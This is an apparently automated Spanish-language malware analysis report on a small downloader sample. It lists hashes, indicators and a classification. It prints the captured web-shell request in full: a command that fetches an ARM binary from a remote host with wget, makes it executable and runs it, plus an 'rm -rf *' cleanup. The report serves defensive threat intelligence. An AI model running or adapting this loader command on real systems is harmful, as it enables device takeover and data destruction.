# 🧬 Payload Analysis

`1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f`

## 📌 Resumen

Texto ASCII de 440 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `nerv.arm7` en `hxxp://93.115.101.XXX:13734/nerv.arm7`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `chmod 777 nerv.arm7`
2. `rm -rf *`
3. `rm nerv.arm7`
4. `wget http:/\/hxxp://93.115.101.XXX:13734/nerv.arm7` **C2 / infraestructura de control:**

- **Posible C2:** `190.179.140.XXX` — confianza Alto, evidencia hardcoded_in_payload
- **Posible C2:** `93.115.101.XXX` — confianza Descartado, evidencia hardcoded_in_payload Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f.md](../../../../../malware-like/oraculo/downloader/1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:04:38.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f`
- **SHA1:** `a19db5d78de25921c812fa70104486839198e361`
- **MD5:** `57b0ecf5505f99f9e154eae5b5500269`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 440 B |
| Entropía | 5.38 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+nerv.arm7;wget+http:/\/hxxp://93.115.101.XXX:13734/nerv.arm7;chmod+777+nerv.arm7;./nerv.arm7+jews;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://93.115.101.XXX:13734/nerv.arm7;chmod+777+nerv.arm7;./nerv.arm7+jews;rm+-rf+* | strings |
| ip | 93.115.101.XXX | static_analysis |
| ip | 190.179.140.XXX | static_analysis |
| command | GET /shell?cd+/tmp;rm+nerv.arm7;wget+http:/\/hxxp://93.115.101.XXX:13734/nerv.arm7;chmod+777+nerv.arm7;./nerv.arm7+jews; | strings |
| hash | 1993de3c5053515d7469ade3b5aa0b5e10985424cb6249e21f6ccb6e3f3db83f | static_analysis |
| ip | 138.197.87.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
